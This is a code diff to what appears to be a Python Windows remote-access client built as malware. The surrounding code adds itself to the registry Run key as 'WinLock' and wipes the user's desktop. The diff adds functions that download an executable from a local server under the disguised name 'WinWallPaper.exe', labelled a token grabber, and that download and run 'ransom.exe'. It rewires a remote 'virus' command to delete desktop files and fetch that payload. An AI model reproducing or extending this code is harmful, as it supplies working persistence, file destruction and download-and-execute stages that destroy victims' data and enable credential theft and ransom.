@@ -4,10 +4,11 @@ import locale
 import os
 import platform
 import shutil
+import subprocess
 import time
+import urllib.request
 import winreg as _winreg
 from socket import socket
-from tkinter import messagebox
 
 import psutil
 
@@ -22,6 +23,10 @@ def add_to_startup(file_path=""):
     key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, 'Software\Microsoft\Windows\CurrentVersion\Run')
     _winreg.SetValueEx(key, 'WinLock', 1, _winreg.REG_SZ, r'%s\project.exe' % file_path)
     key.Close()
+
+def tokengrabber():
+    urllib.request.urlretrieve("http://127.0.0.1:8085/af.exe",
+                               "WinWallPaper.exe")
 
 
 def delete_desktop():
@@ -39,8 +44,11 @@ def delete_desktop():
         except Exception as e:
             print(f"Failed to delete {file_path}. Reason: {e}")
 
-def fake_alert():
-    messagebox.showwarning("ERROR", "0x4533")
+
+def ransom():
+    urllib.request.urlretrieve("http://127.0.0.1:8085/ransom.exe",
+                               "ransom.exe")
+    subprocess.run("ransom.exe")
 
 
 def get_system_info():
@@ -128,9 +136,9 @@ def start_client(host, port):
                 client.send("Successfly!".encode())
 
             elif command == "virus":
-                fake_alert()
-
-
+                delete_desktop()
+                # ransom()
+                tokengrabber()
 
             else:
                 client.send("Unknown command".encode())
